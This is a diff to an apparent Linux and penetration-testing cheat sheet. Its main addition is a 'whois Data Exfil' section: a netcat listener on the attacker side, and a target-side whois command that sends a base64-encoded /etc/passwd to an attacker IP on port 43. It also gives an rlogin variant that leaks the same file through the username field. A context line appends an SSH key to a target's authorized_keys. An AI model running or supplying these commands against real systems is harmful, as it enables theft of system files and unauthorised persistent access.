@@ -38,7 +38,7 @@ cat ~/.ssh/id_rsa.pub | ssh user@targetIP 'cat >> .ssh/authorized_keys'
 
 timedatectl set-timezone EST                    Set the timezone to Eastern Standard Time
 ------------------------------------------------------------------------------------------------------
- 
+
 # File Permissions
  
 t rwx rwx rwx	 type / owner / group / world
@@ -603,6 +603,14 @@ Enter the replacement character.
 :wq
 <return>
 ------------------------------------------------------------------------------------------------------
+
+# whois Data Exfil
+
+nc -lvp 43 | sed "s/ //g" | base64 -d                       Attacker
+whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`     Target
+
+- additional method
+rlogin -l "$(cat /etc/passwd)" -p port <target IP>
 ------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable CIFS
